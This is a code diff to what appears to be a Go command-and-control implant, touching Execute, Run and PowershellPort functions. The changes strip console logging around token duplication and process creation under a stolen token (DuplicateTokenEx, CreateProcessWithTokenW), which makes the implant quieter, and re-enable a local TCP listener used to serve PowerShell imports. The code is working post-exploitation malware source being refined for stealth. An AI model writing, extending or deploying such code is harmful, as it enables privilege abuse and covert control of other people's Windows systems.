@@ -13,6 +13,7 @@ import (
 	"main/crypt"
 	"main/sysinfo"
 	"main/util"
+	"net"
 	"os"
 	"path/filepath"
 	"time"
@@ -296,10 +297,7 @@ func Execute(b []byte, Token uintptr) ([]byte, error) {
 
 		result, _, err = DuplicateTokenEx.Call(Token, MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewToken)))
 		if result != 1 {
-			fmt.Println("[-] DuplicateTokenEx() error:", err)
 			return nil, errors.New("[-] DuplicateTokenEx() error:" + err.Error())
-		} else {
-			fmt.Println("[+] DuplicateTokenEx() success")
 		}
 
 		result, _, err = CreateProcessWithTokenW.Call(
@@ -313,13 +311,9 @@ func Execute(b []byte, Token uintptr) ([]byte, error) {
 			uintptr(unsafe.Pointer(&sI)),
 			uintptr(unsafe.Pointer(&pI)))
 		if result != 1 {
-			fmt.Println("[-] CreateProcessWithTokenW() error:", err)
 			return nil, errors.New("[-] CreateProcessWithTokenW() error:" + err.Error())
-		} else {
-			fmt.Println("[+] CreateProcessWithTokenW() success")
 		}
 		if err != nil && err.Error() != ("The operation completed successfully.") {
-			fmt.Println(err)
 			return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
 		}
 	} else {
@@ -415,10 +409,7 @@ func Run(b []byte, Token uintptr) ([]byte, error) {
 
 		result, _, err = DuplicateTokenEx.Call(Token, MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewToken)))
 		if result != 1 {
-			fmt.Println("[-] DuplicateTokenEx() error:", err)
 			return nil, errors.New("[-] DuplicateTokenEx() error:" + err.Error())
-		} else {
-			fmt.Println("[+] DuplicateTokenEx() success")
 		}
 
 		result, _, err = CreateProcessWithTokenW.Call(
@@ -432,10 +423,7 @@ func Run(b []byte, Token uintptr) ([]byte, error) {
 			uintptr(unsafe.Pointer(&sI)),
 			uintptr(unsafe.Pointer(&pI)))
 		if result != 1 {
-			fmt.Println("[-] CreateProcessWithTokenW() error:", err)
 			return nil, errors.New("[-] CreateProcessWithTokenW() error:" + err.Error())
-		} else {
-			fmt.Println("[+] CreateProcessWithTokenW() success")
 		}
 		if err != nil && err.Error() != ("The operation completed successfully.") {
 			return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
@@ -612,7 +600,7 @@ func PowershellImport(b []byte) ([]byte, error) {
 
 func PowershellPort(portByte []byte, b []byte) ([]byte, error) {
 
-	/*port := ReadShort(portByte)
+	port := ReadShort(portByte)
 	go func() {
 		listen, err := net.Listen("tcp", "127.0.0.1:"+strconv.Itoa(int(port)))
 		if err != nil {
@@ -639,9 +627,7 @@ func PowershellPort(portByte []byte, b []byte) ([]byte, error) {
 
 	}()
 
-	return []byte("Hold on"), nil*/
-
-	return []byte("import function is not support now."), nil
+	return []byte("Hold on"), nil
 
 }
 
